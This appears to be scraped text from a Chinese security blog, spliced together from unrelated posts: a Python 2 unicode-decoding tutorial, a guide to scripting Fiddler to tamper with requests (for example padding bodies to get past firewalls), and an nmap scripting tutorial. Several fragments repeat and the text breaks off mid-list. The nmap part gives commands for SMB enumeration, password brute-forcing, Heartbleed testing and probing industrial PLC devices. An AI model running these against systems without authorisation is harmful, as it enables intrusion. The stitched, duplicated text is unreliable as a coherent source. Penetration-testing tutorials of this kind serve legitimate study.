b.decode(\"gbk\")\n你好\n```\n看到这您可能会觉得奇怪，我们定义变量a的内容是这样的\\u8fdd\\u6cd5\\u8fdd\\u89c4，而那个奇怪的字符串是这样的\n```bash\n\\\\u8fdd\\\\u6cd5\\\\u8fdd\\\\u89c4\n```\n好像多了一些斜杠，表急，看完以下这个测试，您就能明白两者的区别。\n```bash\n>>> b=\"\\\\xc4\\\\xe3\\\\xba\\\\xc3\"\n>>> b.decode(\"gbk\")\nu'\\\\xc4\\\\xe3\\\\xba\\\\xc3'\n>>> print b.decode(\"gbk\")\n\\xc4\\xe3\\xba\\xc3\n>>> c=\"\\xc4\\xe3\\xba\\xc3\"\n>>> print c.decode(\"gbk\")\n你好\n#################\n>>> a=u\"\\\\u8fdd\\\\u6cd5\\\\u8fdd\\\\u89c4”\n>>> print a\n\\u8fdd\\u6cd5\\u8fdd\\u89c4\n>>> b=u\"\\u8fdd\\u6cd5\\u8fdd\\u89c4”\n>>> print b\n违法违规\n>>>\n```\n简单来说，那个奇怪的字符串是经过2次unicode编码后的内容。\n\n#### 内置函数使用\n　　当然让其转化为中文可以借助一个内置的函数，我之所以分布演示，是想更清楚得展示其具体含义。\n将unicode编码的内容转化为中文（注意是内容，而不是字符串变量）\n```bash\na=\"\\\\u8fdd\\\\u6cd5\\\\u8fdd\\u89c4\" #变量a的内容为unicode编码，变量a为string编码（\"\"前不要加u）\nb=a.decode('unicode-escape')\nprint b\n```\n将string编码的内容转化为中文（注意是内容，而不是字符串变量）\n```bash\na=\"\\\\xe5\\\\x85\\\\xb3\\\\xe4\\\\xba\\\\x8e\\\\xe4\" #变量a的内容为string编码，变量a为string编码（\"\"前不要加u）\nb=a.decode('string-escape')\nprint b\n```\n\n##### unicode-escape与utf-8的区别\n补充于2017年4月27日\n```bash\n>>>a=\"\\u4e0a\\u4f20\\u6210\\u529f\"\n>>>b=a.decode('utf-8')\n>>>print type(b)\n<type 'unicode'>\n>>>b\nu'\\\\u4e0a\\\\u4f20\\\\u6210\\\\u529f'\n>>>print b\n\\u4e0a\\u4f20\\u6210\\u529f\n```\n当对变量a做decode('utf-8')时，除了对把变量a的类型从str变成了unicode,a变量的内容也做了utf-8解码，所以多了一些斜杠。\n```bash\n>>>a=\"\\u4e0a\\u4f20\\u6210\\u529f\"\n>>>c=a.decode(\"unicode-escape\")\n>>>print type(c)\n<type 'unicode'>\n>>>c\nu'\\u4e0a\\u4f20\\u6210\\u529f'\n>>>print c\n上传成功\n```\n而对变量a做decode('unicode-escape')时，貌似只有变量本身被decode成unicode了，其内容没有发生改变。\n\n　　我们知道print函数会将变量以及变量内容都encode成str，因此第二个例子能输出中文，而第一个例子输出的还是unicode类型的内容，只不过少了一些斜杠，因为它还需要再encode一次。\n当然本例子的转化，有更简单的方法，如下：\n```bash\n>>> d=u\"\\u4e0a\\u4f20\\u6210\\u529f\"  #定义变量d时，前面加个u，将其变成unicode\n>>> print d\n上传成功\n```\n\n开了一轮飞车，不知道大家有没有晕车，如果实在搞不清以上各种编码关系，没关系记住最后2个函数即可。\n\n### 故事是这样结束的\n　　看着屏幕中输出熟悉的中文字符，我激动地将转码后的内容抛给某司，并殷切地等待着酬劳，等待着欣赏速八大酒店顶层房间迎接的那一抹夕阳，以及细细品味着那一抹诡异的坏笑。直到最终屏幕跳出了一行字：*速八8点场，影院见*。\n\n\n### 补充\n*2017年4月21号*\n存在一个list列表，列表中的字段是unicode格式的，当输出这个list时，内容如下：\n```bash\n[u'\\u827a\\u672f\\u9986', u'\\u5b58\\u50a8\\u7ba1\\u7406', u'\\u609f\\u8005', u'\\u827a\\u54c1', u'\\u7ca4\\u5907\\u4eac', u'\\u767e\\u79cd', u'\\u5fae\\u55b7', u'\\u827a\\u672f\\u4f5c\\u54c1', u'\\u57f9\\u690d', u'\\u6444\\u5f71\\u5bb6', u'\\u666e\\u53ca\\u6559\\u80b2', u'\\u5927\\u9053\\u81f3\\u7b80', u'\\u88c5\\u5e27', u'\\u96c5\\u660c\\u4ee5', u'\\u9274\\u8bc1', u'\\u4e07\\u6377', u'\\u6838\\u5fc3\\u6280\\u672f', u'\\u884d\\u751f\\u54c1']\n```\n怎么让列表里面的内容为中文？我猜想，输出列表时，会自动将里面的中文进行编码，因此可以这样处理：\n```bash\nprint str([i.encode(\"utf-8\") for i in list_nokeyword]).decode('string-escape’)\n```\n输出看看吧\n```bash\n['艺术馆', '存储管理', '悟者', '艺品', '粤备京', '百种', '微喷', '艺术作品', '培植', '摄影家', '普及教育', '大道至简', '装帧', '雅昌以', '鉴证',

a输出的是str格式的中文：你好，原因想必是python中的print语句会自动将unicode字符转化成str格式。如果您对unicode与string不了解，那么请回到文章开头，移步之前那篇分析编码的文章，我想会对您有帮助。\n　　竟然知道了unicode字符长啥样，那么我们可以排除那个奇怪的字符串并不是unicode字符串了。为啥呢？很明显，因为它前面没有u啊。\n\n　　看到这里，您是不是有点迷糊了呢？虽然它前面没有u（u\"\\u4f60....\"），但是它长得确实很像unicode字符啊。不用着急，接下来让我来好好介绍下*字符串变量编码*　以及*字符串内容编码*　的差异。\n\n*说明：以上两个概念是我自己临时取的，不代表官方解释，如有偏差请谅解*\n\n　　所谓字符串变量编码就是我们平常所说的编码，比如string、unicode，string又包含utf-8、gbk、gb2312等。判断方式很简单，用type函数即可。\n```bash\n>>> a=u\"你好\"\n>>> print type(a) \n<type 'unicode'>\n>>> a=\"你好\"\n>>> print type(a)\n<type 'str'>\n```\n　　我们可以看到，unicode或者string代表的是a这个字符串变量的一种编码格式，跟其内容无关。我们知道定义a=\"test\",那么a是string编码；反之定义a=u\"test\"，a便是unicode编码，那么我想问：test是什么编码的？（这里问的是test，而不是a）\n有人会说，test就是一个普通的字符串，没错它确实是一个字符串，它表示a的内容。那么同理当定义\n```bash\na=\"\\\\u8fdd\\\\u6cd5\\\\u8fdd\\\\u89c4\"\n```\n时，a本身是str格式的字符串，那么\n```bash\n\\\\u8fdd\\\\u6cd5\\\\u8fdd\\\\u89c4\n```\n内容本身呢？没错，其内容本身是一个unicode编码后的字符串。好了，还是让我们做实验测试吧。\n\n我们先看看被常见的几种编码格式编码后的字符串内容：\n```bash\n>>> a=u\"你好\".encode(\"gbk\")\n>>> a\n'\\xc4\\xe3\\xba\\xc3'  #内容为gbk编码\n>>> a=u\"你好\".encode(\"utf-8\")\n>>> a\n'\\xe4\\xbd\\xa0\\xe5\\xa5\\xbd'  #内容为utf-8编码\n>>> a=u\"你好\".encode(\"gb2312\")\n>>> a\n'\\xc4\\xe3\\xba\\xc3' #内容为gb2312编码\n>>> a=u\"你好\"\n>>> a\nu'\\u4f60\\u597d'    #内容为unicode编码\n```\n请注意以上几种编码的内容，观察其特点，然后我们再来看下那个奇怪的字符串。\n```bash\n>>> a=\"\\\\u8fdd\\\\u6cd5\\\\u8fdd\\\\u89c4\"\n>>> a\n'\\\\u8fdd\\\\u6cd5\\\\u8fdd\\\\u89c4'\n>>> print type(a) \n<type 'str'>\n>>> print a   \n\\u8fdd\\u6cd5\\u8fdd\\u89c4\n>>>\n```\n我们看到变量a是string格式的。\n```bash\n>>> a=u\"\\\\u8fdd\\\\u6cd5\\\\u8fdd\\\\u89c4\" #在前面加个u，将变量a变成unicode\n>>> print type(a) \n<type 'unicode'>\n>>> print a   #相当于a.encode(\"utf-8\")\n\\u8fdd\\u6cd5\\u8fdd\\u89c4\n```\n我们在变量\"\"前面加个u，表示变量a为unicode字符串，其内容为\n```bash\n\\\\u8fdd\\\\u6cd5\\\\u8fdd\\\\u89c4\n```\n接下print a，发现跟上一步的结果一样，没错，因为print将a从unicode变成了string，而其内容看上去少了一些斜杠。\n```bash\n>>> b=u\"\\u8fdd\\u6cd5\\u8fdd\\u89c4\"\n>>> print type(b) \n<type 'unicode'>\n>>> print b\n违法违规\n>>>\n```\n　　紧接着，我将a的内容，也就是\\u8fdd\\u6cd5\\u8fdd\\u89c4，重新赋值给变量b，此时\"\"也加个u，让其成为unicode格式，然后print b，神奇的一幕发生了，输出的结果竟然转化成中文了。其原因我想是，print语句不仅会将字符串变量a转为成string，也会将其内容转化为string。\n```bash\n>>> a=\"你好\"\n>>> a\n'\\xc4\\xe3\\xba\\xc3'\n>>> a=u\"\\xc4\\xe3\\xba\\xc3\"\n>>> print a\nÄãºÃ\n```\n　　以上例子定义变量a为unicode编码，而其内容为string-utf-8编码，此时当print a时，print语句尝试将a的内容转化为string，但由于其本身就是string编码，因此出现了乱码，反之是可以的。\n```bash\n>>> a=\"你好\"\n>>> a\n'\\xc4\\xe3\\xba\\xc3'\n>>> b=\"\\xc4\\xe3\\xba\\xc3\"\n>>> b.decode(\"gbk\")\nu'\\u4f60\\u597d'\n>>> print b.decode(\"gbk\")\n你好\n```\n看到这您可能会觉得奇怪，我们定义变量a的内容是这样的\\u8fdd\\u6cd5\\u8fdd\\u89c4，而那个奇怪的字符串是这样的\n```bash\n\\\\u8fdd\\\\u6cd5\\\\u8fdd\\\\u89c4\n```\n好像多了一些斜杠，表急，看完以下这个测试，您就能明白两者的区别。\n```bash\n>>> b=\"\\\\xc4\\\\xe3\\\\xba\\\\xc3\"\n>>> b.decode(\"gbk\")\nu'\\\\xc4\\\\xe3\\\\xba\\\\xc3'\n>>> print b.decode(\"gbk\")\n\\xc4\\xe3\\xba\\xc3\n>>> c=\"\\xc4\\xe3\\xba\\xc3\"\n>>> print c.decode(\"gbk\")\n你好\n#################\n>>> a=u\"\\\\u8fdd\\\\u6cd5\\\\u8fdd\\\\u89c4”\n>>> print a\n\\u8fdd\\u6cd5\\u8fdd\\u89c4\n>>> b=u\"\\u8fdd\\u6cd5\\u8fdd\\u89c4”\n>>> print b\n违法违规\n>>>\n```\n简单来说，那个奇怪的字符串是经过2次unicode编码后的内容。\n\n#### 内置函数使用\n　　当然让其转化为中文可以借助一个内置的函数，我之所以分布演示，是想更清楚得展示其具体含义。\n将unicode编码的内容转化为中文（注意是内容，而不是字符串变量）\n```bash\na=\"\\\\u8fdd\\\\u6cd5\\\\u8fdd\\u89c4\" #变量a的内容为unicode编码，变量a为string编码（\"\"前不要加u）\nb=a.decode('unicode-escape')\nprint b\n```\n将string编码的内容转化为中文（注意是内容，而不是字符串变量）\n```bash\na=\"\\\\xe5\\\\x85\\\\xb3\\\\xe4\\\\xba\\\\x8e\\\\xe4\" #变量a的内容为string编码，变量a为string编码（\"\"前不要加u）\nb=a.decode('string-escape')\nprint b\n```\n\n##### unicode-escape与utf-8的区别\n补充于2017年4月27日\n```bash\n>>>a=\"\\u4e0a\\u4f20\\u6210\\u529f\"\n>>>b=a.decode('utf-8')\n>>>print type(b)\n<type 'unicode'>\n>>>b\nu'\\\\u4e0a\\\\u4f20\\\\u6210\\\\u529f'\n>>>print b\n\\u4e0a\\u4f20\\u6210\\u529f\n```\n当对变量a做decode('utf-8')时，除了对把变量a的类型从str变成了unicode,a变量的内容也做了utf-8解码，所以多了一些斜杠。\n```bash\n>>>a=\"\\u4e0a\\u4f20\\u6210\\u529f\"\n>>>c=a.decode(\"unicode-escape\")\n>>>print type(c)\n<type 'unicode'>\n>>>c\nu'\\u4e0a\\u4f20\\u6210\\u529f'\n>>>print c\n上传成功\n```\n而对变量a做decode('unicode-escape')时，貌似只有变量本身被decode成unicode了，其内容没有发生改变。\n\n　　我们知道print函数会将变量以及变量内容都encode成str，因此第二个例子能输出中文，而第一个例子输出的还是unicode类型的内容，只不过少了一些斜杠，因为它还需要再encode一次。\n当然本例子的转化，有更简单的方法，如下：\n```bash\n>>> d=u\"\\u4e0a\\u4f20\\u6210\\u529f\"  #定义变量d时，前面加个u，将其变成unicode\n>>> print d\n上传成功\n```\n\n开了一轮飞车，不知道大家有没有晕车，如果实在搞不清以上各种编码关系，没关系记住最后2个函数即可。\n\n### 故事是这样结束的\n　　看着屏幕中输出熟悉的中文字符，我激动地将转码后的内容抛给某司，并殷切地等待着酬劳，等待着欣赏速八大酒店顶层房间迎接的那一抹夕阳，以及细细品味着那一抹诡异的坏笑。直到最终屏幕跳出了一行字：*速八8点场，影院见*。\n\n\n### 补充\n*2017年4月21号*\n存在一个list列表，列表中的字段是unicode格式的，当输出这个list时，内容如下：\n```bash\n[u'\\u827a\\u672f\\u9986', u'\\u5b58\\u50a8\\u7ba1\\u7406', u'\\u609f\\u8005', u'\\u827a\\u54c1', u'\\u7ca4\\u5907\\u4eac', u'\\u767e\\u79cd', u'\\u5fae\\u55b7', u'\\u827a\\u672f\\u4f5c\\u54c1', u'\\u57f9\\u690d', u'\\u6444\\u5f71\\u5bb6', u'\\u666e\\u53ca\\u6559\\u80b2', u'\\u5927\\u9053\\u81f3\\u7b80', u'\\u88c5\\u5e27', u'\\u96c5\\u660c\\u4ee5', u'\\u9274\\u8bc1', u'\\u4e07\\u6377', u'\\u6838\\u5fc3\\u6280\\u672f', u'\\u884d\\u751f\\u54c1']\n```\n怎么让列表里面的内容为中文？我猜想，输出列表时，会自动将里面的中文进行编码，因此可以这样处理：\n```bash\nprint str([i.encode(\"utf-8\") for i in list_nokeyword]).decode('string-escape’)\n```\n输出看看吧\n```bash\n['艺术馆', '存储管理', '悟者', '艺品', '粤备京', '百种', '微喷', '艺术作品', '培植', '摄影家', '普及教育', '大道至简', '装帧', '雅昌以', '鉴证', '万捷', '核心技术', '衍生品']\n```\n###

a输出的是str格式的中文：你好，原因想必是python中的print语句会自动将unicode字符转化成str格式。如果您对unicode与string不了解，那么请回到文章开头，移步之前那篇分析编码的文章，我想会对您有帮助。<br>　　竟然知道了unicode字符长啥样，那么我们可以排除那个奇怪的字符串并不是unicode字符串了。为啥呢？很明显，因为它前面没有u啊。</p>\n<p>　　看到这里，您是不是有点迷糊了呢？虽然它前面没有u（u”\\u4f60….”），但是它长得确实很像unicode字符啊。不用着急，接下来让我来好好介绍下<em>字符串变量编码</em>　以及<em>字符串内容编码</em>　的差异。</p>\n<p><em>说明：以上两个概念是我自己临时取的，不代表官方解释，如有偏差请谅解</em></p>\n<p>　　所谓字符串变量编码就是我们平常所说的编码，比如string、unicode，string又包含utf-8、gbk、gb2312等。判断方式很简单，用type函数即可。<br><figure

class=\"blockquote-center\">人世起起落落 左手边上演的华灯初上 右手边是繁华落幕的星点余光</blockquote>\n　　本篇作为渗透神器系列第二篇，将介绍一款渗透界web测试开发界比较流行的一款web流量抓包分析工具，Fiddler。Fiddler的功能这里不多说，简单概括就是抓包、改包、重放。本篇的重点不是介绍Fiddler的基础用法，而是介绍如何通过编程打造属于自己的定制化Fiddler。本篇所记内容大部分来自互联网，如觉内容老套可自行绕道，全当个人查询之用，轻喷即可。\n<!--more -->\n\n### 修改规则文件CustomRules.js\nCustomRules.js是用Jscript.NET语言写的，语法类似C#。通过修改CustomRules.js可以修改http的请求和应答，不用中断程序，还可以针对不同的url做特殊的处理。\n#### CustomRules.js文件位置\nFiddler工具菜单栏：\n```bash\nrules->CustomRules \n```\n本地电脑磁盘存放地址：\n```bash         \nC:\\Documents and Settings\\[your user]\\MyDocuments\\Fiddler2\\Scripts\\CustomRules.js\n```\n#### 常用内容\n先分享一个常用的内容：\n```bash\nstatic function OnBeforeRequest(oSession: Session) {\n\n        // oSession.oRequest.headers.Remove(\"Cookie\");   //移除请求包的cookies\n        // oSession.oRequest.headers.Add(\"Cookie\", \"username=admin;\");  //新建cookies\n        // oSession.oRequest[\"Referer\"]=\"http://www.baidu.com\"; //设置referer为baidu\n\n        // if (oSession.HTTPMethodIs(\"POST\")){   //POST修改为GET\n        //     oSession.RequestMethod=\"GET\";\n        // }   \n\n        // var strBody=oSession.GetRequestBodyAsString();   //获取请求包中的body内容，修改其内容。\n        // // // strBody=strBody.replace(\"111\",\"222\");   //替换字符串\n        // strBody=\"11111111111111111111111111111111111\"+strBody;  //在发送的数据包前面加上垃圾数据\n        // // // strBody=strBody.ToUpper(); //全部转化为大写\n        // // // strBody=strBody.ToLower(); //全部转化为小写\n        // oSession.utilSetRequestBody(strBody);\n}\n\n```\n如上所示，修改OnBeforeRequest函数下的代码，可以起到在发送请求之前，自动修改请求包中的一些参数。如可以增删改cookie，headers头参数，可以修改请求包类型等，主要作用就是为了达到渗透测试时某种特殊的作用，比如绕过防火墙。\n\n#### 常用函数\nhttp请求函数：即修改该函数内容，可以在发送http请求包之前修改某些参数。\n```bash\nstatic function OnBeforeRequest(oSession: Session)\n```\nhttp应答函数：即修改该函数内容，可以在接收http应答包之前修改某些参数\n```bash\nstatic function OnBeforeResponse(oSession: Session)\n```\n#### 函数中的方法属性\n##### 筛选某个url\n```bash\nif (oSession.host.indexOf(\"thief.one\") > -1) {}\n```\n##### 修改session中的显示样式\n```bash\noSession[\"ui-color\"] = \"orange\"; #即该记录显示的颜色\n```\n##### 移除http头部中的某字段\n```bash\noSession.oRequest.headers.Remove(\"\");\n```\n##### 修改http头部中的某字段内容\n```bash\noSession.oRequest[\"Referer\"] = \"http://thief.one\";\n```\n##### 修改host\n```bash\noSession.host = \"thief.one\";\n```\n##### 修改Origin字段\n```bash\noSession.oRequest[\"Origin\"] = \"http://thief.one\";\n```\n##### 删除所有的cookie\n```bash\noSession.oRequest.headers.Remove(\"Cookie\");\n```\n##### 新建cookie\n```bash\noSession.oRequest.headers.Add(\"Cookie\", \"username=nMask;\");\n```\n##### 获取Request中的body字符串\n```bash\nvar strBody=oSession.GetRequestBodyAsString();\n```\n##### 用正则表达式或者replace方法去修改string\n```bash\nstrBody=strBody.replace(\"thief\",\"nmask\");\n```\n##### 弹个对话框检查下修改后的body\n```bash             \nFiddlerObject.alert(strBody);\n```\n##### 将修改后的body，重新写回Request中\n```bash\noSession.utilSetRequestBody(strBody);\n```\n##### 修改请求url\n例如：将请求URI中http协议替换成https协议。\n```bash\noSession.fullUrl = \"https\" + oSession.fullUrl.Substring(oSession.fullUrl.IndexOf(':'));\n```\n##### 网络限速\n1000/下载速度 = 需要delay的时间(毫秒)，比如20kB/s 需要delay50毫秒来接收数据。\n```bash\nif (m_SimulateModem) {\n    // Delay sends by 300ms per KB uploaded.\n     oSession[\"request-trickle-delay\"] = \"300\";\n     // Delay receives by 150ms per KB downloaded.\n     oSession[\"response-trickle-delay\"] = \"150\";\n }\n```\nFiddler可以定制化很多功能，以上是我平时常用的一些内容，如想要了解更多用法请参考官方文档：[Fiddler文档](http://docs.telerik.com/fiddler/Configure-Fiddler/Tasks/ConfigureFiddler)\n\n###

class=\"blockquote-center\">这个世界好比一座大熔炉，烧炼出一批又一批品质不同而且和原先的品质也不相同的灵魂</blockquote>\n　　本篇作为渗透神器系列第三篇，将介绍一款经典的端口扫描工具--nmap。目前市面上成熟的端口扫描器有很多，比如massscan(全网扫描器)，zenmap(nmap的GUI版)等，但我个人还是钟爱nmap，原因很简单，因为它很强大，并且支持扩展。Nmap最新几个版本中，加入了nmap script Engine(NSE)功能，支持扩展脚本，即可以在nmap中加载自定义的nse脚本，以达到扫描的目的。目前官方的nse脚本已达500多个，nse脚本地址[https://nmap.org/nsedoc/](https://nmap.org/nsedoc/)，或者查看[github库](https://github.com/nmap/nmap)。\n　　本篇将会介绍如何编写以及使用nse脚本，以便能最大程度地发挥出nmap的强大功能（扩展功能），当然本文后本段也会简单介绍下nmap工具的基本使用方法以及参数设置。\n<!--more -->\n### NSE\n　　nse全称是*nmap脚本引擎*，脚本后缀名为.nse，脚本用Lua语言编写，遵循特定的规则。nse脚本存放在nmap安装目录下的scripts目录下，目前官方提供的大概有500多个，功能涵盖了常用的漏洞检测、端口检测、基线检测等。\n#### nse script exploit\n在scripts目录下新建一个文件，如：hello.nse，写入以下内容：\n```bash\n-- The Head Section --\n-- The Rule Section --\nportrule = function(host, port)\nreturn port.protocol == \"tcp\" and port.number == 80 and port.state == \"open\"\nend\n-- The Action Section --\naction = function(host, port)\nreturn \"Hello world\"\nend\n```\n以上代码运行后，会检测目标ip是否开放了80端口，若开放则返回helloworld。\nnse脚本遵循nmap api规范，其包含三部分内容，其中--开头的行为注释内容。\n##### The Head Section\n该部分包含一些元数据，主要描述脚本的功能，作者，影响力，类别及其他。\n##### The Rule Section\n该部分定义脚本的一些规则，至少包含下面列表中的一个函数：\n* portrule\n* hostrule\n* prerule\n* postrule\n\n##### The Action Section\n该部分定义脚本逻辑，即满足条件后执行的内容，比如上面例子为输出helloworld。\n\n#### 调用内置库\nNSE脚本可以调用内置库，比如http库、shortport库、nmap库等。\n导入方式：\n```bash\nlocal http = require \"http\"\nlocal nmap = require \"nmap\"\nlocal shortport = require \"shortport\"\n```\n更多nse-api参考：https://nmap.org/book/nse-api.html\n更多lua语法参考：http://www.runoob.com/lua/lua-tutorial.html\n#### nse script usage\n当在scripts下面编写完hello.nse脚本后，如何加载使用呢？\n方法一：\n```bash\nnmap --script-updatedb 更新脚本库\nnmap --script=hello    使用该脚本\n```\n方法二：\n```bash\nnmap --script=d:/..../hello.nse 绝对路径\n```\n其他参数：\n```bash\n-sC: 等价于–script=default，使用默认类别的脚本进行扫描 可更换其他类别\n–script=<Lua scripts>: <Lua scripts>使用某个或某类脚本进行扫描，支持通配符描述\n–script-args=<n1=v1,[n2=v2,...]>: 为脚本提供默认参数\n–script-args-file=filename: 使用文件来为脚本提供参数\n–script-trace: 显示脚本执行过程中发送与接收的数据\n–script-updatedb: 更新脚本数据库\n–script-help=<scripts>: 显示脚本的帮助信息，其中<scripts>部分可以逗号分隔的文件或脚本类别\n```\n#### nse example\n对目标机器进行扫描,同时对smb的用户进行枚举。\n```bash\nnmap  --script=smb-enum-users  target_ip\n```\n对目标机器所开启的smb共享进行枚举。\n```bash\nnmap  --script=smb-enum-shares target_ip\n```\n对目标机器的用户名和密码进行暴力猜测。\n```bash\nnmap  --script=smb-brute target_ip\n```\n对目标机器测试心脏滴血漏洞。\n```bash\nnmap -sV --script=ssl-heartbleed target_ip\n```\n再举几个硬件设备的例子：\n```bash\nmodbus-discover.nse （该脚本可以调用Modbus 43（2B功能码）功能码读取设备信息）\nmodbus-enum.nse （Modbus TCP设备枚举脚本）\ns7-enumerate.nse （西门子S7 PLC设备发现脚本，可以枚举PLC的一些基本信息）\nenip-enumerate.nse （可以读取EtherNet/IP设备的基本信息）\nBACnet-discover-enumerate.nse （可以读取BACnet设备的基本信息）\niec-identify.nse （IEC104协议asdu address枚举脚本）\nmms-identify.nse （IEC-61850-8-1协议信息枚举脚本）\n```\n### nmap introduce\n以上内容为nmap nse扩展脚本的基础知识，其中涉及到nse脚本编写的语法规则等，本篇暂不做详细介绍，可参考官方文档。以下内容为nmap基础使用，包含命令行参数等内容。\n#### nmap parameter\nnmap参数：\n```bash\nnmap [Scan Type(s)] [Options] {target specification}\n\nscan type(s) 用于指定扫描类型\noptions 用于指定选项\ntarget specification 用于指定扫描目标\n\n-s 指定扫描类型\n如下：\n-sP (ping扫描) *存活主机探测\n-sS (TCP SYN扫描 隐身扫描)  *默认扫描方式\n-sT (tcp 扫描) * syn 不能用时就tcp扫描\n-sU （UDP 扫描）\n-sA  （ACK扫描） *三次握手 用于探测出防火墙过滤端口 实际渗透中没多大用\n\n-sV   （版本探测）\n-A    操作系统探测\n-O （启用操作系统检测）\n-v    详细\n选项说明\n-P0  [指定端口] (无ping扫描)\n-PU  [指定端口] (udp ping扫描)\n-PS [指定端口] (TCP SYN ping 扫描)\n-PA  [指定端口] (tcp ack ping扫描) \n-PI   使用真正的pingICMP echo请求来扫描目标主机是否正在运行\n\n-iL 指定扫描主机列表\n-iR 随机选择目标\n\n--exclude 排除扫描目标\n--excludefile 排除文件中目标列表\n\n-n (不用域名解析)\n-R (为所有目标解析域名)\n\n-T  时间优化（每隔多久发一次包 ） -T5 最快 -T0 最慢\n-F  快速扫描\n-e  指定网络接口\n-M 设置tcp扫描线程\n```\n#### nmap output\n输出结果：\n```bash\n-oS  保存扫描结果输出\n-oN  把扫描结果重定向到一个可读的文件logfilename中\n-oM  每个结果一行输出\n-oA  同上\n--append-output 附在原来的结果前面\n```\n#### nmap status\nnmap端口状态：\n```bash\nopen（开放的）\nclosed（关闭的）\nfiltered（被过滤的）不确定开放还是关闭\nunfiltered （未被过滤的）\nopenfiltered （开放或者被过滤的）\nclosedfiltered （关闭或者未被过滤的)\n```\n#### nmap常用命令\n以下命令部分收集于网络，部分来自个人总结。\n轻量级扫描：\n```bash\nnmap -sP 192.168.0.0/24   判断哪些主机存活\nnmap -sT 192.168.0.3   开放了哪些端口\nnmap -sS 192.168.0.127 开放了哪些端口（隐蔽扫描）\nnmap -sU 192.168.0.127 开放了哪些端口（UDP）\nnmap

class=\"blockquote-center\">这个世界好比一座大熔炉，烧炼出一批又一批品质不同而且和原先的品质也不相同的灵魂</blockquote>\n　　本篇作为渗透神器系列第三篇，将介绍一款经典的端口扫描工具--nmap。目前市面上成熟的端口扫描器有很多，比如massscan(全网扫描器)，zenmap(nmap的GUI版)等，但我个人还是钟爱nmap，原因很简单，因为它很强大，并且支持扩展。Nmap最新几个版本中，加入了nmap script Engine(NSE)功能，支持扩展脚本，即可以在nmap中加载自定义的nse脚本，以达到扫描的目的。目前官方的nse脚本已达500多个，nse脚本地址[https://nmap.org/nsedoc/](https://nmap.org/nsedoc/)，或者查看[github库](https://github.com/nmap/nmap)。\n　　本篇将会介绍如何编写以及使用nse脚本，以便能最大程度地发挥出nmap的强大功能（扩展功能），当然本文后本段也会简单介绍下nmap工具的基本使用方法以及参数设置。\n<!--more -->\n### NSE\n　　nse全称是*nmap脚本引擎*，脚本后缀名为.nse，脚本用Lua语言编写，遵循特定的规则。nse脚本存放在nmap安装目录下的scripts目录下，目前官方提供的大概有500多个，功能涵盖了常用的漏洞检测、端口检测、基线检测等。\n#### nse script exploit\n在scripts目录下新建一个文件，如：hello.nse，写入以下内容：\n```bash\n-- The Head Section --\n-- The Rule Section --\nportrule = function(host, port)\nreturn port.protocol == \"tcp\" and port.number == 80 and port.state == \"open\"\nend\n-- The Action Section --\naction = function(host, port)\nreturn \"Hello world\"\nend\n```\n以上代码运行后，会检测目标ip是否开放了80端口，若开放则返回helloworld。\nnse脚本遵循nmap api规范，其包含三部分内容，其中--开头的行为注释内容。\n##### The Head Section\n该部分包含一些元数据，主要描述脚本的功能，作者，影响力，类别及其他。\n##### The Rule Section\n该部分定义脚本的一些规则，至少包含下面列表中的一个函数：\n* portrule\n* hostrule\n* prerule\n* postrule\n\n##### The Action Section\n该部分定义脚本逻辑，即满足条件后执行的内容，比如上面例子为输出helloworld。\n\n#### 调用内置库\nNSE脚本可以调用内置库，比如http库、shortport库、nmap库等。\n导入方式：\n```bash\nlocal http = require \"http\"\nlocal nmap = require \"nmap\"\nlocal shortport = require \"shortport\"\n```\n更多nse-api参考：https://nmap.org/book/nse-api.html\n更多lua语法参考：http://www.runoob.com/lua/lua-tutorial.html\n#### nse script usage\n当在scripts下面编写完hello.nse脚本后，如何加载使用呢？\n方法一：\n```bash\nnmap --script-updatedb 更新脚本库\nnmap --script=hello    使用该脚本\n```\n方法二：\n```bash\nnmap --script=d:/..../hello.nse 绝对路径\n```\n其他参数：\n```bash\n-sC: 等价于–script=default，使用默认类别的脚本进行扫描 可更换其他类别\n–script=<Lua scripts>: <Lua scripts>使用某个或某类脚本进行扫描，支持通配符描述\n–script-args=<n1=v1,[n2=v2,...]>: 为脚本提供默认参数\n–script-args-file=filename: 使用文件来为脚本提供参数\n–script-trace: 显示脚本执行过程中发送与接收的数据\n–script-updatedb: 更新脚本数据库\n–script-help=<scripts>: 显示脚本的帮助信息，其中<scripts>部分可以逗号分隔的文件或脚本类别\n```\n#### nse example\n对目标机器进行扫描,同时对smb的用户进行枚举。\n```bash\nnmap  --script=smb-enum-users  target_ip\n```\n对目标机器所开启的smb共享进行枚举。\n```bash\nnmap  --script=smb-enum-shares target_ip\n```\n对目标机器的用户名和密码进行暴力猜测。\n```bash\nnmap  --script=smb-brute target_ip\n```\n对目标机器测试心脏滴血漏洞。\n```bash\nnmap -sV --script=ssl-heartbleed target_ip\n```\n再举几个硬件设备的例子：\n```bash\nmodbus-discover.nse （该脚本可以调用Modbus 43（2B功能码）功能码读取设备信息）\nmodbus-enum.nse （Modbus TCP设备枚举脚本）\ns7-enumerate.nse （西门子S7 PLC设备发现脚本，可以枚举PLC的一些基本信息）\nenip-enumerate.nse （可以读取EtherNet/IP设备的基本信息）\nBACnet-discover-enumerate.nse （可以读取BACnet设备的基本信息）\niec-identify.nse （IEC104协议asdu address枚举脚本）\nmms-identify.nse （IEC-61850-8-1协议信息枚举脚本）\n```\n### nmap introduce\n以上内容为nmap nse扩展脚本的基础知识，其中涉及到nse脚本编写的语法规则等，本篇暂不做详细介绍，可参考官方文档。以下内容为nmap基础使用，包含命令行参数等内容。\n#### nmap parameter\nnmap参数：\n```bash\nnmap [Scan Type(s)] [Options] {target specification}\n\nscan type(s) 用于指定扫描类型\noptions 用于指定选项\ntarget specification 用于指定扫描目标\n\n-s 指定扫描类型\n如下：\n-sP (ping扫描) *存活主机探测\n-sS (TCP SYN扫描 隐身扫描)  *默认扫描方式\n-sT (tcp 扫描) * syn 不能用时就tcp扫描\n-sU （UDP 扫描）\n-sA  （ACK扫描） *三次握手 用于探测出防火墙过滤端口 实际渗透中没多大用\n\n-sV   （版本探测）\n-A    操作系统探测\n-O （启用操作系统检测）\n-v    详细\n选项说明\n-P0  [指定端口] (无ping扫描)\n-PU  [指定端口] (udp ping扫描)\n-PS [指定端口] (TCP SYN ping 扫描)\n-PA  [指定端口] (tcp ack ping扫描) \n-PI   使用真正的pingICMP echo请求来扫描目标主机是否正在运行\n\n-iL 指定扫描主机列表\n-iR 随机选择目标\n\n--exclude 排除扫描目标\n--excludefile 排除文件中目标列表\n\n-n (不用域名解析)\n-R (为所有目标解析域名)\n\n-T  时间优化（每隔多久发一次包 ） -T5 最快 -T0 最慢\n-F  快速扫描\n-e  